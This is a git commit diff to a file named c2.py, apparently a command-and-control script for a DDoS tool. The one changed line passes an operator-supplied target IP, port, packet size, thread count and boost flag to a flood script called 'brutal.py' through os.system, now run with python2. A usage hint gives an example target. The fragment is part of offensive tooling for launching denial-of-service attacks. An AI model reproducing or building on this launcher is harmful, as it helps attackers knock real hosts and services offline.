74cbd294cbd6d1464c5e7925b40b96b01f2407ef
RzLModz <97414556+RzLModz@users.noreply.github.com>
2024-07-28 21:52:50 +0700

    Add files via upload

--- c2.py
+++ c2.py
@@ -327,7 +327,7 @@ def main():
                 bytes = cnc.split()[3]
                 thrs = cnc.split()[4]
                 bost = cnc.split()[5]
-                os.system(f'./python3 brutal.py {ip} {port} {bytes} {thrs} {bost}')           
+                os.system(f'python2 brutal.py {ip} {port} {bytes} {thrs} {bost}')           
             except IndexError:    
                 print('Example: 1.1.1.1 80 500 500 Y/N')
                 
